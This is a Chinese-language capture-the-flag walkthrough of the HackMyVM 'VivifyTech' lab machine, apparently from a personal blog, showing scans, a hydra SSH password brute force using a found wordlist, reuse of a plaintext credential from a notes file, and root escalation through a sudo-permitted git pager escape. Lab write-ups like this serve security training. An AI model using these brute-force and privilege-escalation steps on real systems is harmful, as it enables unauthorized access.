---
title: HMV VivifyTech
published: 2025-02-18
pinned: false
description: HMV VivifyTech wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-02-18
pubDate: 2025-02-18
---


## VivifyTech

### 靶场链接
https://hackmyvm.eu/machines/machine.php?vm=VivifyTech

### 日常扫描
```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.64.3
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.64.1    16:7f:ce:9b:a1:64       (Unknown: locally administered)
192.168.64.23   de:be:f3:07:14:ee       (Unknown: locally administered)

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.867 seconds (137.12 hosts/sec). 2 responded
                                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -T4 -Pn -p- 192.168.64.23
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 11:32 HKT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 11:32 (0:00:03 remaining)
Nmap scan report for 192.168.64.23
Host is up (0.00098s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000

```

扫一下
```
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.64.23

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 17 11:52:06 2025
URL_BASE: http://192.168.64.23/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.64.23/ ----
+ http://192.168.64.23/index.html (CODE:200|SIZE:10701)                        
+ http://192.168.64.23/server-status (CODE:403|SIZE:278)                       
==> DIRECTORY: http://192.168.64.23/wordpress/                                 
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/ ----
+ http://192.168.64.23/wordpress/index.php (CODE:301|SIZE:0)                   
==> DIRECTORY: http://192.168.64.23/wordpress/wp-admin/                        
==> DIRECTORY: http://192.168.64.23/wordpress/wp-content/                      
==> DIRECTORY: http://192.168.64.23/wordpress/wp-includes/                     
+ http://192.168.64.23/wordpress/xmlrpc.php (CODE:405|SIZE:42)                 
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-admin/ ----
+ http://192.168.64.23/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)          
==> DIRECTORY: http://192.168.64.23/wordpress/wp-admin/css/                    
==> DIRECTORY: http://192.168.64.23/wordpress/wp-admin/images/                 
==> DIRECTORY: http://192.168.64.23/wordpress/wp-admin/includes/               
+ http://192.168.64.23/wordpress/wp-admin/index.php (CODE:302|SIZE:0)          
==> DIRECTORY: http://192.168.64.23/wordpress/wp-admin/js/                     
==> DIRECTORY: http://192.168.64.23/wordpress/wp-admin/maint/                  
==> DIRECTORY: http://192.168.64.23/wordpress/wp-admin/network/                
==> DIRECTORY: http://192.168.64.23/wordpress/wp-admin/user/                   
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-content/ ----
+ http://192.168.64.23/wordpress/wp-content/index.php (CODE:200|SIZE:0)        
==> DIRECTORY: http://192.168.64.23/wordpress/wp-content/plugins/              
==> DIRECTORY: http://192.168.64.23/wordpress/wp-content/themes/               
==> DIRECTORY: http://192.168.64.23/wordpress/wp-content/upgrade/              
==> DIRECTORY: http://192.168.64.23/wordpress/wp-content/uploads/              
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-admin/network/ ----
+ http://192.168.64.23/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)  
+ http://192.168.64.23/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)  
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-admin/user/ ----
+ http://192.168.64.23/wordpress/wp-admin/user/admin.php (CODE:503|SIZE:2545)  
+ http://192.168.64.23/wordpress/wp-admin/user/index.php (CODE:503|SIZE:2545)  
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-content/plugins/ ----
+ http://192.168.64.23/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-content/themes/ ----
+ http://192.168.64.23/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0) 
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.64.23/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Feb 17 11:53:24 2025
DOWNLOADED: 36896 - FOUND: 13

```
### 反弹shell
有wp网站，wpscan扫一下
```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.64.23/wordpress --api-token=* -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.64.23/wordpress/ [192.168.64.23]
[+] Started: Mon Feb 17 13:00:58 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.64.23/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.64.23/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.64.23/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.64.23/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.2 identified (Latest, released on 2025-02-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.64.23/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.7.2</generator>
 |  - http://192.168.64.23/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.2</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <==> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] sancelisso
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.64.23/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 21

[+] Finished: Mon Feb 17 13:01:08 2025
[+] Requests Done: 57
[+] Cached Requests: 6
[+] Data Sent: 16.279 KB
[+] Data Received: 358.677 KB
[+] Memory used: 168.461 MB
[+] Elapsed time: 00:00:09

```

好像并木有什么好用的，只有一个用户sancelisso
ffuf探测一下，找到http://192.168.64.23/wordpress/wp-includes/secrets.txt
```
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.64.23/wordpress/wp-includes/secrets.txt"
agonglo
tegbesou
paparazzi
womenintech
Password123
bohicon
agodjie
tegbessou
Oba
IfÃ¨
Abomey
Gelede
BeninCity
Oranmiyan
Zomadonu
Ewuare
Brass
Ahosu
Igodomigodo
Edaiken
Olokun
Iyoba
Agasu
Uzama
IhaOminigbon
Agbado
OlokunFestival
Ovoranmwen
Eghaevbo
EwuareII
Egharevba
IgueFestival
Isienmwenro
Ugie-Olokun
Olokunworship
Ukhurhe
OsunRiver
Uwangue
miammiam45
Ewaise
Iyekowa
Idia
Olokunmask
Emotan
OviaRiver
Olokunceremony
Akenzua
Edoculture

```
http://192.168.64.23/wordpress/index.php/2023/12/05/the-story-behind-vivifytech/ 是wp里面发布的文章
搞到用户名
```
sarah
mark
emily
jake
alex
sancelisso
```

爆破ssh
```
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -L usr.txt -P pass.txt 192.168.64.23 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-17 13:23:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 294 login tries (l:6/p:49), ~19 tries per task
[DATA] attacking ssh://192.168.64.23:22/
[22][ssh] host: 192.168.64.23   login: sarah   password: bohicon

```

成功ssh上去
```
sarah@VivifyTech:~$ ls -a
.   .bash_history  .bashrc   .local    .profile
..  .bash_logout   .history  .private  user.txt
sarah@VivifyTech:~$ cat .private
cat: .private: Is a directory
sarah@VivifyTech:~$ cd .private/
sarah@VivifyTech:~/.private$ ls
Tasks.txt
sarah@VivifyTech:~/.private$ cat Tasks.txt 
- Change the Design and architecture of the website
- Plan for an audit, it seems like our website is vulnerable
- Remind the team we need to schedule a party before going to holidays
- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N

```
这玩意好像是个备忘录，绷不住了,用这个账号ssh上去
```
gbodja@VivifyTech:~$ sudo -l
Matching Defaults entries for gbodja on VivifyTech:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    !admin_flag, use_pty

User gbodja may run the following commands on VivifyTech:
    (ALL) NOPASSWD: /usr/bin/git

```

直接写入!/bin/bash提权
```
gbodja@VivifyTech:~$ sudo -u root /usr/bin/git help config
/bin/bash: line 1: bin/bash: Permission denied
!done  (press RETURN)
root@VivifyTech:/home/gbodja# id
uid=0(root) gid=0(root) groups=0(root)

```